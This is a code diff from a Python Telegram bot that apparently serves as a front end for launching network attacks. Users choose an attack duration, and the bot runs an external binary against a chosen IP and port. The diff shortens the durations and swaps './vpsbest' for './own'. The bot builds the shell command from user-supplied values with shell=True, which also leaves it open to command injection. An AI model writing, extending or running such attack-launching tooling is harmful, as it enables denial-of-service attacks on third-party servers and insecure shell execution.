@@ -60,11 +60,11 @@ def attack_mode_selection(call):
         return
 
     if mode == "auto":
-        duration = random.choice([120, 180, 240, 300])
+        duration = random.choice([60, 80, 100, 120])
         start_attack(call, user_id, ip, port, duration)
     elif mode == "manual":
         keyboard = telebot.types.InlineKeyboardMarkup()
-        for sec in [120, 180, 300]:
+        for sec in [80, 100, 120]:
             keyboard.add(telebot.types.InlineKeyboardButton(f"{sec} sec", callback_data=f"start_{user_id}_{ip}_{port}_{sec}"))
         bot.edit_message_text("Choose attack duration:", call.message.chat.id, call.message.message_id, reply_markup=keyboard)
 
@@ -84,7 +84,7 @@ def start_attack(call, user_id, ip, port, duration):
     global active_attacks, cooldowns
 
     cooldowns[user_id] = duration * 2  # Cooldown starts immediately
-    full_command = f"./vpsbest {ip} {port} {9} {duration} 900"
+    full_command = f"./own {ip} {port} {duration} 900"
     subprocess.Popen(full_command, shell=True)
 
     bot.edit_message_text(
